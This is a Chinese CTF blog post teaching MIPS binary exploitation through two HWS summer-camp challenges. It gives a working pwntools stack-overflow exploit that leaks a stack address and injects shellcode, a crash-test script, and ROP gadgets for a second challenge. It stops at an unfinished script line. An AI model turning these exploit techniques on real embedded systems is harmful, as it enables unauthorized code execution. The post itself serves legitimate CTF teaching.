---
title: HWS赛题 入门 MIPS Pwn 
date: 2020-09-24 00:00:00
categories:
- CTF/Pwn
tags: mips 
---

> 以HWS夏令营的两道题目入门MIPS Pwn，两道题目都是栈溢出，但是**栈地址是否已知**这个利用前提不同，故利用方式有也所不同。

## 准备

### MIPS基础知识

- [CTF-MIPS-入门指南](https://196011564.github.io/2019/12/31/CTF-MIPS-%E5%85%A5%E9%97%A8%E6%8C%87%E5%8D%97/#%E4%B8%80%E3%80%81MISP%E5%AF%84%E5%AD%98%E5%99%A8)
- [mips_arm汇编学习](https://b0ldfrev.gitbook.io/note/iot/mipsarm-hui-bian-xue-xi#1-ji-cun-qi)

MIPS的通用寄存器个数比较多，无论是32位还是64位都有32个通用寄存器：

- [MIPS32 Architecture](https://www.mips.com/products/architectures/mips32-2/)
- [MIPS64 Architecture](https://www.mips.com/products/architectures/mips64/)
- [为什么 ARM 和 MIPS 那么多寄存器，x86 那么少？](https://www.zhihu.com/question/24551779)

|寄存器编号 | 别名    | 用途                                                          |
| ------- | ------- | ------------------------------------------------------------ |
| $0      | $zero   | 常量0(constant value 0)                                      |
| $1      | $at     | 保留给汇编器(Reserved for assembler)                         |
| $2-$3   | $v0-$v1 | 函数调用返回值(values for results and expression evaluation) |
| $4-$7   | $a0-$a3 | 函数调用参数(arguments)                                      |
| $8-$15  | $t0-$t7 | 暂时的(或随便用的)                                           |
| $16-$23 | $s0-$s7 | 保存的(或如果用，需要SAVE/RESTORE的)(saved)                   |
| $24-$25 | $t8-$t9 | 暂时的(或随便用的)                                           |
| $28     | $gp     | 全局指针(Global Pointer)                                    |
| $29     | $sp     | 堆栈指针(Stack Pointer)$30                                  |
| $31     | $ra     | 返回地址(return address)                                    |


### mipsrop（IDA插件）

安装IDA的mipsrop插件：[https://github.com/tacnetsol/ida/tree/master/plugins](https://github.com/tacnetsol/ida/tree/master/plugins)

```
python ./install.py /Applications/IDA\ Pro\ 7.5python2/ida.app/Contents/MacOS/
```

**注意：这个插件需要IDApython2，故如果装IDA时选择python3则可以重新装一个python2的IDA，两个版本的IDA目录不同即可共存。**

![image](https://xuanxuanblingbling.github.io/assets/pic/mips/mipsrop.png)


### binutils

因为要使用pwntools生成不同架构下的shellcode，也就是shellcraft这个模块，所以需要安装pwntools的[binutils](https://github.com/Gallopsled/pwntools-binutils/)，以编译对应架构下的机器码。这里说一下pwntools的shellcraft模块，这个模块的文档可以参考：[pwnlib.shellcraft](http://docs.pwntools.com/en/latest/shellcraft.html)。平时我们比较常用的是```shellcraft.sh()```，这里没有指明目标架构是因为一般我们在context中已经指定，所以不需要重复指定。如果不指定直接使用```shellcraft.sh()```，这是默认i386的指令集。

另外也可以通过shellcraft的子模块来指定目标指令集，比如：`shellcraft.mips.linux.sh()`，这里我们来观察一下，pwntools对于mips架构的linux目标提供哪些shellcode？可以使用python的dir函数来观察：
```python
Python 2.7.16 (default, Oct 25 2019, 20:31:23) 
[GCC 4.2.1 Compatible Apple LLVM 10.0.1 (clang-1001.0.46.4)] on darwin
Type "help", "copyright", "credits" or "license" for more information.
>>> from pwn import *
>>> dir(shellcraft.mips.linux)
['__all__', '__file__', '__name__', '__package__', '__path__', '_llseek', '_newselect', '_sysctl', 'accept', 'accept4', 'access', 'acct', 'add_key', 'adjtimex', 'afs_syscall', 'alarm', 'arch_prctl', 'arm_fadvise64_64', 'arm_sync_file_range', 'bdflush', 'bind', 'bindsh', 'break', 'brk', 'cachectl', 'cacheflush', 'capget', 'capset', 'cat', 'chdir', 'chmod', 'chown', 'chown32', 'chroot', 'clock_getres', 'clock_gettime', 'clock_nanosleep', 'clock_settime', 'clone', 'close', 'connect', 'connect', 'creat', 'create_module', 'delete_module', 'dup', 'dup2', 'dup3', 'dupsh', 'echo', 'epoll_create', 'epoll_create1', 'epoll_ctl', 'epoll_ctl_old', 'epoll_pwait', 'epoll_wait', 'epoll_wait_old', 'eventfd', 'eventfd2', 'execve', 'exit', 'exit_group', 'faccessat', 'fadvise64', 'fadvise64_64', 'fallocate', 'fanotify_init', 'fanotify_mark', 'fchdir', 'fchmod', 'fchmodat', 'fchown', 'fchown32', 'fchownat', 'fcntl', 'fcntl64', 'fdatasync', 'fgetxattr', 'findpeer', 'findpeersh', 'flistxattr', 'flock', 'fork', 'forkbomb', 'forkexit', 'fremovexattr', 'fsetxattr', 'fstat', 'fstat64', 'fstatat', 'fstatat64', 'fstatfs', 'fstatfs64', 'fsync', 'ftime', 'ftruncate', 'ftruncate64', 'futex', 'futimesat', 'get_kernel_syms', 'get_mempolicy', 'get_robust_list', 'get_thread_area', 'getcpu', 'getcwd', 'getdents', 'getdents64', 'getegid', 'getegid32', 'geteuid', 'geteuid32', 'getgid', 'getgid32', 'getgroups', 'getgroups32', 'getitimer', 'getpeername', 'getpgid', 'getpgrp', 'getpid', 'getpmsg', 'getppid', 'getpriority', 'getresgid', 'getresgid32', 'getresuid', 'getresuid32', 'getrlimit', 'getrusage', 'getsid', 'getsockname', 'getsockopt', 'gettid', 'gettimeofday', 'getuid', 'getuid32', 'getxattr', 'gtty', 'idle', 'init_module', 'inotify_add_watch', 'inotify_init', 'inotify_init1', 'inotify_rm_watch', 'io_cancel', 'io_destroy', 'io_getevents', 'io_setup', 'io_submit', 'ioctl', 'ioperm', 'iopl', 'ioprio_get', 'ioprio_set', 'ipc', 'kexec_load', 'keyctl', 'kill', 'killparent', 'lchown', 'lchown32', 'lgetxattr', 'link', 'linkat', 'listen', 'listen', 'listxattr', 'llistxattr', 'lock', 'lookup_dcookie', 'lremovexattr', 'lseek', 'lsetxattr', 'lstat', 'lstat64', 'madvise', 'madvise1', 'mbind', 'migrate_pages', 'mincore', 'mkdir', 'mkdirat', 'mknod', 'mknodat', 'mlock', 'mlockall', 'mmap', 'mmap2', 'modify_ldt', 'mount', 'move_pages', 'mprotect', 'mpx', 'mq_getsetattr', 'mq_notify', 'mq_open', 'mq_timedreceive', 'mq_timedsend', 'mq_unlink', 'mremap', 'msgctl', 'msgget', 'msgrcv', 'msgsnd', 'msync', 'munlock', 'munlockall', 'munmap', 'nanosleep', 'newfstatat', 'nfsservctl', 'nice', 'oldfstat', 'oldlstat', 'oldolduname', 'oldstat', 'olduname', 'open', 'openat', 'pause', 'pciconfig_iobase', 'pciconfig_read', 'pciconfig_write', 'perf_event_open', 'personality', 'pipe', 'pipe2', 'pivot_root', 'poll', 'ppoll', 'prctl', 'pread', 'pread64', 'preadv', 'prlimit64', 'prof', 'profil', 'pselect6', 'ptrace', 'putpmsg', 'pwrite', 'pwrite64', 'pwritev', 'query_module', 'quotactl', 'read', 'readahead', 'readdir', 'readfile', 'readlink', 'readlinkat', 'readv', 'reboot', 'recv', 'recvfrom', 'recvmmsg', 'recvmsg', 'remap_file_pages', 'removexattr', 'rename', 'renameat', 'request_key', 'reserved221', 'reserved82', 'restart_syscall', 'rmdir', 'sched_get_priority_max', 'sched_get_priority_min', 'sched_getaffinity', 'sched_getparam', 'sched_getscheduler', 'sched_rr_get_interval', 'sched_setaffinity', 'sched_setparam', 'sched_setscheduler', 'sched_yield', 'security', 'select', 'semctl', 'semget', 'semop', 'semtimedop', 'send', 'sendfile', 'sendfile64', 'sendmsg', 'sendto', 'set_mempolicy', 'set_robust_list', 'set_thread_area', 'set_tid_address', 'setdomainname', 'setfsgid', 'setfsgid32', 'setfsuid', 'setfsuid32', 'setgid', 'setgid32', 'setgroups', 'setgroups32', 'sethostname', 'setitimer', 'setpgid', 'setpriority', 'setregid', 'setregid32', 'setresgid', 'setresgid32', 'setresuid', 'setresuid32', 'setreuid', 'setreuid32', 'setrlimit', 'setsid', 'setsockopt', 'settimeofday', 'setuid', 'setuid32', 'setxattr', 'sgetmask', 'sh', 'shmat', 'shmctl', 'shmdt', 'shmget', 'shutdown', 'sigaction', 'sigaltstack', 'signal', 'signalfd', 'signalfd4', 'sigpending', 'sigprocmask', 'sigqueueinfo', 'sigreturn', 'sigsuspend', 'sigtimedwait', 'socket', 'socketcall', 'socketcall_accept', 'socketcall_bind', 'socketcall_connect', 'socketcall_getpeername', 'socketcall_getsockname', 'socketcall_getsockopt', 'socketcall_listen', 'socketcall_recv', 'socketcall_recvfrom', 'socketcall_recvmsg', 'socketcall_send', 'socketcall_sendmsg', 'socketcall_sendto', 'socketcall_setsockopt', 'socketcall_shutdown', 'socketcall_socket', 'socketcall_socketpair', 'socketpair', 'splice', 'ssetmask', 'stager', 'stat', 'stat64', 'statfs', 'statfs64', 'stime', 'stty', 'swapoff', 'swapon', 'symlink', 'symlinkat', 'sync', 'sync_file_range', 'sync_file_range2', 'sys_kexec_load', 'syscall', 'syscall', 'syscalls', 'sysfs', 'sysinfo', 'syslog', 'sysmips', 'tee', 'tgkill', 'tgsigqueueinfo', 'time', 'timer_create', 'timer_delete', 'timer_getoverrun', 'timer_gettime', 'timer_settime', 'timerfd', 'timerfd_create', 'timerfd_gettime', 'timerfd_settime', 'times', 'tkill', 'truncate', 'truncate64', 'tuxcall', 'ugetrlimit', 'ulimit', 'umask', 'umount', 'umount2', 'uname', 'unlink', 'unlinkat', 'unshare', 'uselib', 'ustat', 'utime', 'utimensat', 'utimes', 'vfork', 'vhangup', 'vm86', 'vm86old', 'vmsplice', 'vserver', 'wait4', 'waitid', 'waitpid', 'write', 'writev']
```

或者使用如下方法开启python的tab补全：

```python
import readline
import rlcompleter
readline.parse_and_bind("tab: complete")
```

写成一行并查看`shellcraft.mips.linux.`如下：

```python
Python 2.7.16 (default, Oct 25 2019, 20:31:23) 
[GCC 4.2.1 Compatible Apple LLVM 10.0.1 (clang-1001.0.46.4)] on darwin
Type "help", "copyright", "credits" or "license" for more information.
>>> from pwn import *
>>> import readline,rlcompleter;readline.parse_and_bind("tab: complete")
>>> shellcraft.mips.linux.
Display all 445 possibilities? (y or n)
shellcraft.mips.linux.__all__                  shellcraft.mips.linux.fallocate(               shellcraft.mips.linux.kexec_load(              shellcraft.mips.linux.read(                    shellcraft.mips.linux.sigqueueinfo(
shellcraft.mips.linux.__class__(               shellcraft.mips.linux.fanotify_init(           shellcraft.mips.linux.keyctl(                  shellcraft.mips.linux.readahead(               shellcraft.mips.linux.sigreturn(
shellcraft.mips.linux.__delattr__(             shellcraft.mips.linux.fanotify_mark(           shellcraft.mips.linux.kill(                    shellcraft.mips.linux.readdir(                 shellcraft.mips.linux.sigsuspend(
shellcraft.mips.linux.__dict__                 shellcraft.mips.linux.fchdir(                  shellcraft.mips.linux.killparent(              shellcraft.mips.linux.readfile(                shellcraft.mips.linux.sigtimedwait(
shellcraft.mips.linux.__dir__(                 shellcraft.mips.linux.fchmod(                  shellcraft.mips.linux.lchown(                  shellcraft.mips.linux.readlink(                shellcraft.mips.linux.socket(
shellcraft.mips.linux.__doc__                  shellcraft.mips.linux.fchmodat(                shellcraft.mips.linux.lchown32(                shellcraft.mips.linux.readlinkat(              shellcraft.mips.linux.socketcall(
shellcraft.mips.linux.__file__                 shellcraft.mips.linux.fchown(                  shellcraft.mips.linux.lgetxattr(               shellcraft.mips.linux.readv(                   shellcraft.mips.linux.socketcall_accept(
shellcraft.mips.linux.__format__(              shellcraft.mips.linux.fchown32(                shellcraft.mips.linux.listen(                  shellcraft.mips.linux.reboot(                  shellcraft.mips.linux.socketcall_bind(
shellcraft.mips.linux.__getattr__(             shellcraft.mips.linux.fchownat(                shellcraft.mips.linux.listxattr(               shellcraft.mips.linux.recv(                    shellcraft.mips.linux.socketcall_connect(
shellcraft.mips.linux.__getattribute__(        shellcraft.mips.linux.fcntl(                   shellcraft.mips.linux.llistxattr(              shellcraft.mips.linux.recvfrom(                shellcraft.mips.linux.socketcall_getpeername(
shellcraft.mips.linux.__hash__(                shellcraft.mips.linux.fcntl64(                 shellcraft.mips.linux.lock(                    shellcraft.mips.linux.recvmmsg(                shellcraft.mips.linux.socketcall_getsockname(
shellcraft.mips.linux.__init__(                shellcraft.mips.linux.fdatasync(               shellcraft.mips.linux.lookup_dcookie(          shellcraft.mips.linux.recvmsg(                 shellcraft.mips.linux.socketcall_getsockopt(
shellcraft.mips.linux.__lazyinit__             shellcraft.mips.linux.fgetxattr(               shellcraft.mips.linux.lremovexattr(            shellcraft.mips.linux.registers                shellcraft.mips.linux.socketcall_listen(
shellcraft.mips.linux.__module__               shellcraft.mips.linux.findpeer(                shellcraft.mips.linux.lseek(                   shellcraft.mips.linux.remap_file_pages(        shellcraft.mips.linux.socketcall_recv(
shellcraft.mips.linux.__name__                 shellcraft.mips.linux.findpeersh(              shellcraft.mips.linux.lsetxattr(               shellcraft.mips.linux.removexattr(             shellcraft.mips.linux.socketcall_recvfrom(
shellcraft.mips.linux.__new__(                 shellcraft.mips.linux.flistxattr(              shellcraft.mips.linux.lstat(                   shellcraft.mips.linux.rename(                  shellcraft.mips.linux.socketcall_recvmsg(
shellcraft.mips.linux.__package__              shellcraft.mips.linux.flock(                   shellcraft.mips.linux.lstat64(                 shellcraft.mips.linux.renameat(                shellcraft.mips.linux.socketcall_send(
shellcraft.mips.linux.__path__                 shellcraft.mips.linux.fork(                    shellcraft.mips.linux.madvise(                 shellcraft.mips.linux.request_key(             shellcraft.mips.linux.socketcall_sendmsg(
shellcraft.mips.linux.__reduce__(              shellcraft.mips.linux.forkbomb(                shellcraft.mips.linux.madvise1(                shellcraft.mips.linux.reserved221(             shellcraft.mips.linux.socketcall_sendto(
shellcraft.mips.linux.__reduce_ex__(           shellcraft.mips.linux.forkexit(                shellcraft.mips.linux.mbind(                   shellcraft.mips.linux.reserved82(              shellcraft.mips.linux.socketcall_setsockopt(
shellcraft.mips.linux.__repr__(                shellcraft.mips.linux.fremovexattr(            shellcraft.mips.linux.migrate_pages(           shellcraft.mips.linux.restart_syscall(         shellcraft.mips.linux.socketcall_shutdown(
shellcraft.mips.linux.__setattr__(             shellcraft.mips.linux.fsetxattr(               shellcraft.mips.linux.mincore(                 shellcraft.mips.linux.rmdir(                   shellcraft.mips.linux.socketcall_socket(
shellcraft.mips.linux.__shellcodes__(          shellcraft.mips.linux.fstat(                   shellcraft.mips.linux.mkdir(                   shellcraft.mips.linux.sched_get_priority_max(  shellcraft.mips.linux.socketcall_socketpair(
shellcraft.mips.linux.__sizeof__(              shellcraft.mips.linux.fstat64(                 shellcraft.mips.linux.mkdirat(                 shellcraft.mips.linux.sched_get_priority_min(  shellcraft.mips.linux.socketpair(
shellcraft.mips.linux.__str__(                 shellcraft.mips.linux.fstatat(                 shellcraft.mips.linux.mknod(                   shellcraft.mips.linux.sched_getaffinity(       shellcraft.mips.linux.splice(
shellcraft.mips.linux.__subclasshook__(        shellcraft.mips.linux.fstatat64(               shellcraft.mips.linux.mknodat(                 shellcraft.mips.linux.sched_getparam(          shellcraft.mips.linux.ssetmask(
shellcraft.mips.linux.__weakref__              shellcraft.mips.linux.fstatfs(                 shellcraft.mips.linux.mlock(                   shellcraft.mips.linux.sched_getscheduler(      shellcraft.mips.linux.stager(
shellcraft.mips.linux._context_modules(        shellcraft.mips.linux.fstatfs64(               shellcraft.mips.linux.mlockall(                shellcraft.mips.linux.sched_rr_get_interval(   shellcraft.mips.linux.stat(
shellcraft.mips.linux._get_source(             shellcraft.mips.linux.fsync(                   shellcraft.mips.linux.mmap(                    shellcraft.mips.linux.sched_setaffinity(       shellcraft.mips.linux.stat64(
shellcraft.mips.linux._llseek(                 shellcraft.mips.linux.ftime(                   shellcraft.mips.linux.mmap2(                   shellcraft.mips.linux.sched_setparam(          shellcraft.mips.linux.statfs(
shellcraft.mips.linux._newselect(              shellcraft.mips.linux.ftruncate(               shellcraft.mips.linux.modify_ldt(              shellcraft.mips.linux.sched_setscheduler(      shellcraft.mips.linux.statfs64(
shellcraft.mips.linux._sysctl(                 shellcraft.mips.linux.ftruncate64(             shellcraft.mips.linux.mount(                   shellcraft.mips.linux.sched_yield(             shellcraft.mips.linux.stime(
shellcraft.mips.linux._templates               shellcraft.mips.linux.futex(                   shellcraft.mips.linux.move_pages(              shellcraft.mips.linux.security(                shellcraft.mips.linux.stty(
shellcraft.mips.linux.accept(                  shellcraft.mips.linux.futimesat(               shellcraft.mips.linux.mprotect(                shellcraft.mips.linux.select(                  shellcraft.mips.linux.swapoff(
shellcraft.mips.linux.accept4(                 shellcraft.mips.linux.get_kernel_syms(         shellcraft.mips.linux.mpx(                     shellcraft.mips.linux.semctl(                  shellcraft.mips.linux.swapon(
shellcraft.mips.linux.access(                  shellcraft.mips.linux.get_mempolicy(           shellcraft.mips.linux.mq_getsetattr(           shellcraft.mips.linux.semget(                  shellcraft.mips.linux.sync(
shellcraft.mips.linux.acct(                    shellcraft.mips.linux.get_robust_list(         shellcraft.mips.linux.mq_notify(               shellcraft.mips.linux.semop(                   shellcraft.mips.linux.sync_file_range(
shellcraft.mips.linux.add_key(                 shellcraft.mips.linux.get_thread_area(         shellcraft.mips.linux.mq_open(                 shellcraft.mips.linux.semtimedop(              shellcraft.mips.linux.sync_file_range2(
shellcraft.mips.linux.adjtimex(                shellcraft.mips.linux.getcpu(                  shellcraft.mips.linux.mq_timedreceive(         shellcraft.mips.linux.send(                    shellcraft.mips.linux.sys_kexec_load(
shellcraft.mips.linux.afs_syscall(             shellcraft.mips.linux.getcwd(                  shellcraft.mips.linux.mq_timedsend(            shellcraft.mips.linux.sendfile(                shellcraft.mips.linux.syscall(
shellcraft.mips.linux.alarm(                   shellcraft.mips.linux.getdents(                shellcraft.mips.linux.mq_unlink(               shellcraft.mips.linux.sendfile64(              shellcraft.mips.linux.syscalls
shellcraft.mips.linux.arch_prctl(              shellcraft.mips.linux.getdents64(              shellcraft.mips.linux.mremap(                  shellcraft.mips.linux.sendmsg(                 shellcraft.mips.linux.sysfs(
shellcraft.mips.linux.arm_fadvise64_64(        shellcraft.mips.linux.getegid(                 shellcraft.mips.linux.msgctl(                  shellcraft.mips.linux.sendto(                  shellcraft.mips.linux.sysinfo(
shellcraft.mips.linux.arm_sync_file_range(     shellcraft.mips.linux.getegid32(               shellcraft.mips.linux.msgget(                  shellcraft.mips.linux.set_mempolicy(           shellcraft.mips.linux.syslog(
shellcraft.mips.linux.bdflush(                 shellcraft.mips.linux.geteuid(                 shellcraft.mips.linux.msgrcv(                  shellcraft.mips.linux.set_robust_list(         shellcraft.mips.linux.sysmips(
shellcraft.mips.linux.bind(                    shellcraft.mips.linux.geteuid32(               shellcraft.mips.linux.msgsnd(                  shellcraft.mips.linux.set_thread_area(         shellcraft.mips.linux.tee(
shellcraft.mips.linux.bindsh(                  shellcraft.mips.linux.getgid(                  shellcraft.mips.linux.msync(                   shellcraft.mips.linux.set_tid_address(         shellcraft.mips.linux.templates
shellcraft.mips.linux.brk(                     shellcraft.mips.linux.getgid32(                shellcraft.mips.linux.munlock(                 shellcraft.mips.linux.setdomainname(           shellcraft.mips.linux.tgkill(
shellcraft.mips.linux.cachectl(                shellcraft.mips.linux.getgroups(               shellcraft.mips.linux.munlockall(              shellcraft.mips.linux.setfsgid(                shellcraft.mips.linux.tgsigqueueinfo(
shellcraft.mips.linux.cacheflush(              shellcraft.mips.linux.getgroups32(             shellcraft.mips.linux.munmap(                  shellcraft.mips.linux.setfsgid32(              shellcraft.mips.linux.time(
shellcraft.mips.linux.capget(                  shellcraft.mips.linux.getitimer(               shellcraft.mips.linux.nanosleep(               shellcraft.mips.linux.setfsuid(                shellcraft.mips.linux.timer_create(
shellcraft.mips.linux.capset(                  shellcraft.mips.linux.getpeername(             shellcraft.mips.linux.newfstatat(              shellcraft.mips.linux.setfsuid32(              shellcraft.mips.linux.timer_delete(
shellcraft.mips.linux.cat(                     shellcraft.mips.linux.getpgid(                 shellcraft.mips.linux.nfsservctl(              shellcraft.mips.linux.setgid(                  shellcraft.mips.linux.timer_getoverrun(
shellcraft.mips.linux.chdir(                   shellcraft.mips.linux.getpgrp(                 shellcraft.mips.linux.nice(                    shellcraft.mips.linux.setgid32(                shellcraft.mips.linux.timer_gettime(
shellcraft.mips.linux.chmod(                   shellcraft.mips.linux.getpid(                  shellcraft.mips.linux.okay(                    shellcraft.mips.linux.setgroups(               shellcraft.mips.linux.timer_settime(
shellcraft.mips.linux.chown(                   shellcraft.mips.linux.getpmsg(                 shellcraft.mips.linux.oldfstat(                shellcraft.mips.linux.setgroups32(             shellcraft.mips.linux.timerfd(
shellcraft.mips.linux.chown32(                 shellcraft.mips.linux.getppid(                 shellcraft.mips.linux.oldlstat(                shellcraft.mips.linux.sethostname(             shellcraft.mips.linux.timerfd_create(
shellcraft.mips.linux.chroot(                  shellcraft.mips.linux.getpriority(             shellcraft.mips.linux.oldolduname(             shellcraft.mips.linux.setitimer(               shellcraft.mips.linux.timerfd_gettime(
shellcraft.mips.linux.clock_getres(            shellcraft.mips.linux.getresgid(               shellcraft.mips.linux.oldstat(                 shellcraft.mips.linux.setpgid(                 shellcraft.mips.linux.timerfd_settime(
shellcraft.mips.linux.clock_gettime(           shellcraft.mips.linux.getresgid32(             shellcraft.mips.linux.olduname(                shellcraft.mips.linux.setpriority(             shellcraft.mips.linux.times(
shellcraft.mips.linux.clock_nanosleep(         shellcraft.mips.linux.getresuid(               shellcraft.mips.linux.open(                    shellcraft.mips.linux.setregid(                shellcraft.mips.linux.tkill(
shellcraft.mips.linux.clock_settime(           shellcraft.mips.linux.getresuid32(             shellcraft.mips.linux.openat(                  shellcraft.mips.linux.setregid32(              shellcraft.mips.linux.truncate(
shellcraft.mips.linux.clone(                   shellcraft.mips.linux.getrlimit(               shellcraft.mips.linux.pause(                   shellcraft.mips.linux.setresgid(               shellcraft.mips.linux.truncate64(
shellcraft.mips.linux.close(                   shellcraft.mips.linux.getrusage(               shellcraft.mips.linux.pciconfig_iobase(        shellcraft.mips.linux.setresgid32(             shellcraft.mips.linux.tuxcall(
shellcraft.mips.linux.connect(                 shellcraft.mips.linux.getsid(                  shellcraft.mips.linux.pciconfig_read(          shellcraft.mips.linux.setresuid(               shellcraft.mips.linux.ugetrlimit(
shellcraft.mips.linux.creat(                   shellcraft.mips.linux.getsockname(             shellcraft.mips.linux.pciconfig_write(         shellcraft.mips.linux.setresuid32(             shellcraft.mips.linux.ulimit(
shellcraft.mips.linux.create_module(           shellcraft.mips.linux.getsockopt(              shellcraft.mips.linux.perf_event_open(         shellcraft.mips.linux.setreuid(                shellcraft.mips.linux.umask(
shellcraft.mips.linux.delete_module(           shellcraft.mips.linux.gettid(                  shellcraft.mips.linux.personality(             shellcraft.mips.linux.setreuid32(              shellcraft.mips.linux.umount(
shellcraft.mips.linux.dup(                     shellcraft.mips.linux.gettimeofday(            shellcraft.mips.linux.pipe(                    shellcraft.mips.linux.setrlimit(               shellcraft.mips.linux.umount2(
shellcraft.mips.linux.dup2(                    shellcraft.mips.linux.getuid(                  shellcraft.mips.linux.pipe2(                   shellcraft.mips.linux.setsid(                  shellcraft.mips.linux.uname(
shellcraft.mips.linux.dup3(                    shellcraft.mips.linux.getuid32(                shellcraft.mips.linux.pivot_root(              shellcraft.mips.linux.setsockopt(              shellcraft.mips.linux.unlink(
shellcraft.mips.linux.dupsh(                   shellcraft.mips.linux.getxattr(                shellcraft.mips.linux.poll(                    shellcraft.mips.linux.settimeofday(            shellcraft.mips.linux.unlinkat(
shellcraft.mips.linux.echo(                    shellcraft.mips.linux.gtty(                    shellcraft.mips.linux.ppoll(                   shellcraft.mips.linux.setuid(                  shellcraft.mips.linux.unshare(
shellcraft.mips.linux.epoll_create(            shellcraft.mips.linux.idle(                    shellcraft.mips.linux.prctl(                   shellcraft.mips.linux.setuid32(                shellcraft.mips.linux.uselib(
shellcraft.mips.linux.epoll_create1(           shellcraft.mips.linux.init_module(             shellcraft.mips.linux.pread(                   shellcraft.mips.linux.setxattr(                shellcraft.mips.linux.ustat(
shellcraft.mips.linux.epoll_ctl(               shellcraft.mips.linux.inotify_add_watch(       shellcraft.mips.linux.pread64(                 shellcraft.mips.linux.sgetmask(                shellcraft.mips.linux.utime(
shellcraft.mips.linux.epoll_ctl_old(           shellcraft.mips.linux.inotify_init(            shellcraft.mips.linux.preadv(                  shellcraft.mips.linux.sh(                      shellcraft.mips.linux.utimensat(
shellcraft.mips.linux.epoll_pwait(             shellcraft.mips.linux.inotify_init1(           shellcraft.mips.linux.pretty(                  shellcraft.mips.linux.shmat(                   shellcraft.mips.linux.utimes(
shellcraft.mips.linux.epoll_wait(              shellcraft.mips.linux.inotify_rm_watch(        shellcraft.mips.linux.prlimit64(               shellcraft.mips.linux.shmctl(                  shellcraft.mips.linux.vfork(
shellcraft.mips.linux.epoll_wait_old(          shellcraft.mips.linux.io_cancel(               shellcraft.mips.linux.prof(                    shellcraft.mips.linux.shmdt(                   shellcraft.mips.linux.vhangup(
shellcraft.mips.linux.eval(                    shellcraft.mips.linux.io_destroy(              shellcraft.mips.linux.profil(                  shellcraft.mips.linux.shmget(                  shellcraft.mips.linux.vm86(
shellcraft.mips.linux.eventfd(                 shellcraft.mips.linux.io_getevents(            shellcraft.mips.linux.pselect6(                shellcraft.mips.linux.shutdown(                shellcraft.mips.linux.vm86old(
shellcraft.mips.linux.eventfd2(                shellcraft.mips.linux.io_setup(                shellcraft.mips.linux.ptrace(                  shellcraft.mips.linux.sigaction(               shellcraft.mips.linux.vmsplice(
shellcraft.mips.linux.execve(                  shellcraft.mips.linux.io_submit(               shellcraft.mips.linux.putpmsg(                 shellcraft.mips.linux.sigaltstack(             shellcraft.mips.linux.vserver(
shellcraft.mips.linux.exit(                    shellcraft.mips.linux.ioctl(                   shellcraft.mips.linux.pwrite(                  shellcraft.mips.linux.signal(                  shellcraft.mips.linux.wait4(
shellcraft.mips.linux.exit_group(              shellcraft.mips.linux.iopl(                    shellcraft.mips.linux.pwrite64(                shellcraft.mips.linux.signalfd(                shellcraft.mips.linux.waitid(
shellcraft.mips.linux.faccessat(               shellcraft.mips.linux.ioprio_get(              shellcraft.mips.linux.pwritev(                 shellcraft.mips.linux.signalfd4(               shellcraft.mips.linux.waitpid(
shellcraft.mips.linux.fadvise64(               shellcraft.mips.linux.ioprio_set(              shellcraft.mips.linux.query_module(            shellcraft.mips.linux.sigpending(              shellcraft.mips.linux.write(
shellcraft.mips.linux.fadvise64_64(            shellcraft.mips.linux.ipc(                     shellcraft.mips.linux.quotactl(                shellcraft.mips.linux.sigprocmask(             shellcraft.mips.linux.writev(
>>> shellcraft.mips.linux.
```

平日我们常用的



## 入营赛题

附件：[]()

栈平衡

```python
from pwn import *
context(arch='mips',endian='little',log_level='debug')
io = process(["qemu-mipsel","-L","./","./Mplogin"])

# leak stack(old fp)
io.sendafter("name : ","admin".ljust(0x18,'a'))
io.recvuntil("Correct name : ");io.recv(0x18)
stack = u32(io.recv(4))

# stack overflow
io.sendafter("Pre_Password : ","access".ljust(0x14,"2")+p32(0x100))
io.sendafter("Password : ","0123456789".ljust(0x28,"2")+p32(stack)+asm(shellcraft.sh()))
io.interactive()
```

## 结营赛题

附件：[]()


### 分析

```c
bool pwn()
{
  int v0; // $v0
  _BOOL4 result; // $v0
  int v3; // [sp+0h] [+0h] BYREF
  int v4[2]; // [sp+10h] [+10h] BYREF
  _BYTE *v5; // [sp+18h] [+18h]
  _BYTE *v6; // [sp+1Ch] [+1Ch]
  unsigned int i; // [sp+20h] [+20h]
  int j; // [sp+24h] [+24h]
  int v9; // [sp+28h] [+28h]
  int v10; // [sp+2Ch] [+2Ch]
  int v11; // [sp+30h] [+30h]
  int *v12; // [sp+34h] [+34h]
  int *v13; // [sp+38h] [+38h]
  int *v14; // [sp+3Ch] [+3Ch]
  int v15; // [sp+40h] [+40h]
  int v16; // [sp+44h] [+44h]
  _BYTE *v17; // [sp+48h] [+48h]
  int v18[3]; // [sp+4Ch] [+4Ch] BYREF

  v6 = (_BYTE *)malloc(512);
  puts("Enter the group number: ");
  if ( !_isoc99_scanf("%d", v18) )
  {
    printf("Input error!");
    exit(-1);
  }
  if ( !v18[0] || v18[0] >= 0xAu )
  {
    fwrite("The numbers is illegal! Exit...\n", 1, 32, stderr, 4883200);
    exit(-1);
  }
  v18[1] = (int)&v3;
  v9 = 36;
  v10 = 36 * v18[0];
  v11 = 36 * v18[0] - 1;
  v12 = v4;
  memset(v4, 0, 36 * v18[0]);
  for ( i = 0; ; ++i )
  {
    result = i < v18[0];
    if ( i >= v18[0] )
      break;
    v13 = (int *)((char *)v12 + i * v9);
    v14 = v13;
    memset(v6, 0, 4);
    puts("Enter the id and name, separated by `:`, end with `.` . eg => '1:Job.' ");
    v15 = read(0, v6, 768);
    if ( v13 )
    {
      v0 = atoi(v6);
      *v14 = v0;
      v16 = strchr(v6, ':');
      for ( j = 0; v6++; ++j )
      {
        if ( *v6 == 10 )
        {
          v5 = v6;
          break;
        }
      }
      v17 = &v5[-v16];
      if ( !v16 )
      {
        puts("format error!");
        exit(-1);
      }
      memcpy(v14 + 1, v16 + 1, v17);
    }
    else
    {
      printf("Error!");
      v14[1] = 1633771776;
    }
  }
  return result;
}
```

堆溢出：

```c
v6 = (_BYTE *)malloc(512);
read(0, v6, 768);
```

栈溢出：

```c
int v4[2]; // [sp+10h] [+10h] BYREF
v12 = v4;
v13 = (int *)((char *)v12 + i * v9);
v14 = v13;
memcpy(v14 + 1, v16 + 1, v17);
```

### 测试

直接用cyclic()无法劫持返回地址，故手动测试，溢出边界为0x90个字节：

```python
from pwn import *
context(arch='mips',endian='big',log_level='debug')
io = process(["qemu-mips", "-g", "1234", "./pwn"])
io.sendlineafter("number:","1")
payload = '1:'+'a'*0x90+p32(0xdeadbeef)
io.sendlineafter("Job.'",payload)
io.interactive()
```

### 利用

```
mipsrop.stackfinder()
0x004273C4 addiu $a2,$sp,0x70+var_C  jalr  $s0 

mipsrop.find("move $t9,$a2")
0x00421684 move $t9,$a2  jr    $a2   
```


```python
from pwn import *
